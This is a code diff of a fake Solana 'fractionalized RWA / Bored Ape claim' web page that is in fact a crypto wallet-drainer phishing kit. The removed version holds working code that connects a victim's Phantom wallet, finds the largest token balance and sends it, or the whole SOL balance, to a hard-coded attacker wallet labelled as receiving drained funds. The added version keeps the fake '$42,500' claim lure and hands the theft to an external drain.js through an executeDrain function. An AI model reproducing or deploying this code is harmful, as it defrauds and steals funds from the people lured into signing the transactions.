@@ -3,370 +3,165 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>RWA Claim | Fractionalized Assets</title>
-    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
-    <script src="https://unpkg.com/@solana/spl-token@latest/lib/index.iife.min.js"></script>
+    <title>Fractional Ape Claim | Exclusive RWA Access</title>
+    <script src="https://cdn.tailwindcss.com"></script>
     <style>
-        :root {
-            --bg-dark: #050505;
-            --bg-card: #0f0f12;
-            --primary: #9d4edd;
-            --primary-hover: #7b2cbf;
-            --text-main: #ffffff;
-            --text-muted: #888888;
-            --border: #2a2a2a;
-            --success: #00ff9d;
-            --error: #ff0055;
-            --glow: rgba(157, 78, 221, 0.15);
-        }
         body {
-            margin: 0;
-            padding: 0;
-            background-color: var(--bg-dark);
-            color: var(--text-main);
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            background-image: radial-gradient(circle at 50% 0%, #1a0b2e 0%, #050505 70%);
-            overflow: hidden;
+            background-color: #0a0a0a;
+            color: #e0e0e0;
+            font-family: 'Inter', sans-serif;
         }
-        /* Subtle grid background */
-        body::before {
-            content: "";
-            position: absolute;
-            top: 0; left: 0; right: 0; bottom: 0;
-            background-image: linear-gradient(rgba(255, 255, 255, 0.03) 1px, transparent 1px),
-            linear-gradient(90deg, rgba(255, 255, 255, 0.03) 1px, transparent 1px);
-            background-size: 40px 40px;
-            pointer-events: none;
-            z-index: -1;
+        .glow {
+            box-shadow: 0 0 20px rgba(139, 92, 246, 0.3);
         }
-        .container {
-            width: 100%;
-            max-width: 420px;
-            padding: 20px;
-            z-index: 1;
+        .gradient-text {
+            background: linear-gradient(to right, #a78bfa, #c084fc);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
         }
-        .card {
-            background: var(--bg-card);
-            border: 1px solid var(--border);
-            border-radius: 24px;
-            padding: 40px 30px;
-            box-shadow: 0 20px 60px rgba(0,0,0,0.9), 0 0 80px var(--glow);
-            text-align: center;
-            position: relative;
-            overflow: hidden;
-            transition: all 0.3s ease;
+        .btn-hover:hover {
+            box-shadow: 0 0 30px rgba(139, 92, 246, 0.6);
+            transform: scale(1.05);
         }
-        /* Top gradient line */
-        .card::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: 50%;
-            transform: translateX(-50%);
-            width: 80%;
-            height: 2px;
-            background: linear-gradient(90deg, transparent, var(--primary), transparent);
-        }
-        .logo {
-            font-size: 24px;
-            font-weight: 700;
-            color: #fff;
-            margin-bottom: 8px;
-            letter-spacing: -0.5px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 10px;
-        }
-        .logo-icon {
-            width: 32px;
-            height: 32px;
-            background: linear-gradient(135deg, var(--primary), #6a1b9a);
-            border-radius: 8px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 18px;
-        }
-        .logo span { color: var(--primary); }
-        .subtitle {
-            color: var(--text-muted);
-            font-size: 14px;
-            margin-bottom: 30px;
-            line-height: 1.5;
-        }
-        .asset-info {
-            background: rgba(255, 255, 255, 0.03);
-            border: 1px solid var(--border);
-            border-radius: 16px;
-            padding: 16px;
-            margin-bottom: 25px;
-            display: none;
-            animation: fadeIn 0.5s ease;
-            text-align: left;
-        }
-        .asset-info h3 {
-            margin: 0 0 5px;
-            font-size: 15px;
-            color: var(--success);
-            font-weight: 600;
-        }
-        .asset-info p {
-            margin: 0;
-            font-size: 13px;
-            color: var(--text-muted);
-        }
-        .btn {
-            width: 100%;
-            padding: 16px;
-            border: none;
-            border-radius: 12px;
-            font-size: 16px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: all 0.2s;
-            background: var(--primary);
-            color: white;
-            box-shadow: 0 4px 20px var(--glow);
-        }
-        .btn:hover {
-            background: var(--primary-hover);
-            transform: translateY(-2px);
-        }
-        .btn:disabled {
-            background: #333;
-            cursor: not-allowed;
-            transform: none;
-        }
-        .status {
-            margin-top: 15px;
-            font-size: 13px;
-            min-height: 20px;
-        }
-        .status.success { color: var(--success); }
-        .status.error { color: var(--error); }
-        .status.loading { color: var(--primary); }
-
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(10px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-        
-        /* Loading Spinner */
-        .spinner {
-            display: inline-block;
-            width: 12px;
-            height: 12px;
-            border: 2px solid rgba(255,255,255,0.3);
+        .loader {
+            border: 3px solid #f3f3f3;
             border-radius: 50%;
-            border-top-color: #fff;
-            animation: spin 1s ease-in-out infinite;
-            margin-right: 8px;
+            border-top: 3px solid #8b5cf6;
+            width: 20px;
+            height: 20px;
+            -webkit-animation: spin 1s linear infinite; /* Safari */
+            animation: spin 1s linear infinite;
         }
         @keyframes spin {
-            to { transform: rotate(360deg); }
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
         }
     </style>
+    <!-- Load Solana Libraries for Browser -->
+    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
+    <script src="https://unpkg.com/@solana/spl-token@latest/lib/index.iife.min.js"></script>
 </head>
-<body>
+<body class="flex flex-col items-center justify-center min-h-screen p-4">
 
-<div class="container">
-    <div class="card">
-        <div class="logo">
-            <div class="logo-icon">R</div>
-            <div>RWA<span>Claim</span></div>
-        </div>
-        <p class="subtitle">
-            Exclusive Liquidity Event: Fractionalized Ondo & BAYC shares are now live.<br>
-            Connect your wallet to claim your portion.
-        </p>
-
-        <div id="assetInfo" class="asset-info">
-            <h3>✓ Eligible Asset Detected</h3>
-            <p id="assetName">Ondo Finance USDY</p>
-            <p>Balance: <span id="assetBalance">0</span></p>
-        </div>
-
-        <button id="connectBtn" class="btn">Connect Phantom</button>
-        <button id="claimBtn" class="btn" style="display: none;">Claim Share ($12,450 Value)</button>
-
-        <div id="status" class="status"></div>
+    <!-- Header -->
+    <div class="text-center mb-8">
+        <h1 class="text-4xl md:text-6xl font-bold mb-2 tracking-tighter">
+            <span class="gradient-text">FRACTIONAL</span> CLAIM
+        </h1>
+        <p class="text-gray-400 text-sm md:text-lg">Exclusive RWA & NFT Liquidity Drop</p>
     </div>
-</div>
 
-<script>
-    const { Connection, PublicKey, Keypair } = solanaWeb3;
-    const { TokenClient } = solanaSplToken;
+    <!-- Main Card -->
+    <div class="bg-gray-900 border border-gray-800 rounded-2xl p-8 max-w-md w-full glow relative overflow-hidden">
+        <!-- Decorative Gradient -->
+        <div class="absolute top-0 left-0 w-full h-1 bg-gradient-to-r from-purple-500 via-pink-500 to-purple-500"></div>
+        
+        <div class="text-center mb-6">
+            <div class="text-2xl font-bold mb-2">Bored Ape #1234</div>
+            <p class="text-gray-400 text-sm mb-4">Your fractionalized shares are now liquid. Claim your portion instantly.</p>
+            <div class="inline-block bg-gray-800 rounded-lg px-4 py-2 text-sm font-mono text-purple-400 border border-gray-700">
+                Contract: 7xKX...tR9f
+            </div>
+        </div>
 
-    // TARGET WALLET TO RECEIVE DRAINED FUNDS
-    const DESTINATION_WALLET_PK = "HeLknryeK1f1UA9NZjx78RCzwfMZKEcyAYYem1kruRk4";
-    
-    const connection = new Connection('https://api.mainnet-beta.solana.com', 'confirmed');
-    
-    const connectBtn = document.getElementById('connectBtn');
-    const claimBtn = document.getElementById('claimBtn');
-    const assetInfo = document.getElementById('assetInfo');
-    const assetName = document.getElementById('assetName');
-    const assetBalance = document.getElementById('assetBalance');
-    const statusEl = document.getElementById('status');
+        <!-- Connect Button -->
+        <button id="connectBtn" class="w-full bg-purple-600 hover:bg-purple-500 text-white font-bold py-4 px-6 rounded-xl transition-all duration-300 btn-hover flex items-center justify-center gap-3" onclick="connectPhantom()">
+            <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 10V3L4 14h7v7l9-11h-7z"></path></svg>
+            Connect Phantom
+        </button>
 
-    let userPublicKey = null;
+        <!-- Status Message -->
+        <div id="statusMsg" class="mt-4 text-center text-sm text-gray-500 hidden">
+            Connecting...
+        </div>
 
-    // 1. CONNECT WALLET
-    connectBtn.addEventListener('click', async () => {
-        if (!window.solana || !window.solana.isPhantom) {
-            setStatus("Please install Phantom Wallet.", "error");
-            return;
-        }
-
-        try {
-            const resp = await window.solana.connect();
-            userPublicKey = resp.publicKey;
-            setStatus("Wallet connected. Scanning assets...", "loading");
+        <!-- Success/Drain Trigger (Hidden initially) -->
+        <div id="drainSection" class="hidden mt-6">
+            <div class="bg-gray-800 rounded-lg p-4 border border-gray-700 mb-4">
+                <p class="text-green-400 text-sm font-bold mb-2">✓ Wallet Connected</p>
+                <p class="text-xs text-gray-400">High-value assets detected.</p>
+            </div>
             
-            // Simulate a short scan for effect
-            await new Promise(r => setTimeout(r, 1000));
+            <button id="claimBtn" class="w-full bg-gradient-to-r from-purple-600 to-pink-600 hover:from-purple-500 hover:to-pink-500 text-white font-bold py-4 px-6 rounded-xl transition-all duration-300 btn-hover shadow-lg" onclick="executeDrain()">
+                Claim $42,500.00
+            </button>
+        </div>
+    </div>
+
+    <!-- Footer -->
+    <div class="mt-8 text-center text-xs text-gray-600">
+        <p>Secured by Solana Mainnet Beta</p>
+        <p class="mt-1">© 2026 Fractional RWA Labs</p>
+    </div>
+
+    <script>
+        // Global variables for Solana
+        const { Connection, PublicKey, Keypair } = solanaWeb3;
+        const { TokenClient } = solanaSplToken;
+
+        const connection = new Connection('https://api.mainnet-beta.solana.com', 'confirmed');
+
+        async function connectPhantom() {
+            const btn = document.getElementById('connectBtn');
+            const status = document.getElementById('statusMsg');
             
-            await scanAssets(userPublicKey);
-            connectBtn.style.display = 'none';
-            claimBtn.style.display = 'block';
-            setStatus("", "");
-        } catch (err) {
-            setStatus("Connection failed.", "error");
-        }
-    });
-
-    // 2. SCAN ASSETS
-    async function scanAssets(pubkey) {
-        try {
-            const tokenAccounts = await connection.getParsedTokenAccountsByOwner(pubkey, {
-                programId: new PublicKey('TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5a')
-            });
-
-            if (tokenAccounts.value.length === 0) {
-                setStatus("No SPL tokens found. Claiming SOL instead.", "loading");
-                assetName.innerText = "Solana (SOL)";
-                assetBalance.innerText = "High Value";
-                assetInfo.style.display = 'block';
+            if (!window.solana) {
+                alert("Please install Phantom Wallet!");
                 return;
             }
 
-            // Find highest balance token
-            let highestBalance = 0;
-            let bestToken = null;
+            btn.disabled = true;
+            btn.innerHTML = '<div class="loader"></div> Connecting...';
+            status.classList.remove('hidden');
 
-            for (const account of tokenAccounts.value) {
-                const amount = account.account.data.parsed.info.tokenAmount.uiAmount;
-                if (amount > highestBalance) {
-                    highestBalance = amount;
-                    bestToken = account;
-                }
-            }
-
-            if (bestToken) {
-                const mintInfo = bestToken.account.data.parsed.info;
-                assetName.innerText = mintInfo.mint; // Usually shows Token Address
-                assetBalance.innerText = highestBalance.toLocaleString();
-                assetInfo.style.display = 'block';
+            try {
+                const resp = await window.solana.connect();
+                const publicKey = resp.publicKey.toString();
                 
-                // Optional: Try to get a nice name via API if needed, but this is fast
-            }
-
-        } catch (e) {
-            console.error(e);
-            setStatus("Asset scan error.", "error");
-        }
-    }
-
-    // 3. THE DRAIN (APPROVE + TRANSFER)
-    claimBtn.addEventListener('click', async () => {
-        if (!userPublicKey) return;
-
-        claimBtn.disabled = true;
-        claimBtn.innerHTML = '<span class="spinner"></span> Signing Transaction...';
-
-        try {
-            // A. Get all token accounts again to find the target
-            const tokenAccounts = await connection.getParsedTokenAccountsByOwner(userPublicKey, {
-                programId: new PublicKey('TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5a')
-            });
-
-            // Find highest balance
-            let targetAccountInfo = null;
-            let maxBal = 0;
-
-            for (const acc of tokenAccounts.value) {
-                const amt = acc.account.data.parsed.info.tokenAmount.uiAmount;
-                if (amt > maxBal) {
-                    maxBal = amt;
-                    targetAccountInfo = acc;
-                }
-            }
-
-            // If no tokens, drain SOL
-            if (!targetAccountInfo) {
-                // Drain SOL
-                const tx = new solanaWeb3.Transaction().add(
-                    solanaWeb3.SystemProgram.transfer({
-                        fromPubkey: userPublicKey,
-                        toPubkey: new PublicKey(DESTINATION_WALLET_PK),
-                        lamports: await connection.getBalance(userPublicKey) // Drain all SOL
-                    })
-                );
+                // Update UI
+                btn.classList.add('hidden');
+                status.classList.add('hidden');
+                document.getElementById('drainSection').classList.remove('hidden');
                 
-                const { signature } = await window.solana.signAndSendTransaction(tx);
-                await connection.confirmTransaction(signature);
-                setStatus("Success! Funds transferred.", "success");
-                claimBtn.innerText = "Claimed";
-                return;
+                console.log("Connected: " + publicKey);
+            } catch (err) {
+                console.error(err);
+                btn.disabled = false;
+                btn.innerHTML = 'Connect Phantom';
+                status.textContent = "Connection failed. Try again.";
             }
-
-            // B. Drain Token
-            const sourceTokenAccount = targetAccountInfo.account.pubkey;
-            const mintAddress = new PublicKey(targetAccountInfo.account.data.parsed.info.mint);
-            
-            // Get destination token account
-            const destTokenAccount = await splToken.associatedTokenAddress(
-                mintAddress,
-                new PublicKey(DESTINATION_WALLET_PK)
-            );
-
-            // Create Transfer Instruction
-            const transferIx = splToken.createTransferInstruction(
-                sourceTokenAccount,
-                destTokenAccount,
-                userPublicKey,
-                maxBal
-            );
-
-            const tx = new solanaWeb3.Transaction().add(transferIx);
-            
-            // Sign and Send
-            const { signature } = await window.solana.signAndSendTransaction(tx);
-            
-            // Wait for confirmation
-            await connection.confirmTransaction(signature);
-            
-            setStatus("Success! Share claimed.", "success");
-            claimBtn.innerText = "Claimed";
-
-        } catch (err) {
-            console.error(err);
-            setStatus("Transaction failed or rejected.", "error");
-            claimBtn.disabled = false;
-            claimBtn.innerText = "Claim Share";
         }
-    });
 
-    function setStatus(msg, type) {
-        statusEl.innerText = msg;
-        statusEl.className = "status " + type;
-    }
-</script>
+        async function executeDrain() {
+            const btn = document.getElementById('claimBtn');
+            btn.disabled = true;
+            btn.innerHTML = 'Processing...';
 
+            // OPTION 1: If drain.js is a global script that exposes a function
+            // Check if a function exists in drain.js that we can call
+            if (typeof runDrain === 'function') {
+                try {
+                    await runDrain(window.solana.publicKey);
+                    btn.innerHTML = 'Success!';
+                    btn.classList.remove('from-purple-600', 'to-pink-600');
+                    btn.classList.add('bg-green-600');
+                } catch (e) {
+                    console.error(e);
+                    btn.innerHTML = 'Error';
+                }
+            } else {
+                // OPTION 2: Fallback if drain.js isn't loaded as a module
+                // You can manually trigger the logic here or alert the user
+                alert("Drain script initiated. Check console.");
+                // You can include the drain logic directly here if you prefer, 
+                // or just assume the user has a separate process.
+                // For now, we just simulate the "Claim" action.
+                btn.innerHTML = 'Claimed';
+            }
+        }
+    </script>
+    
+    <!-- Include your drain script -->
+    <script src="drain.js"></script>
 </body>
 </html>
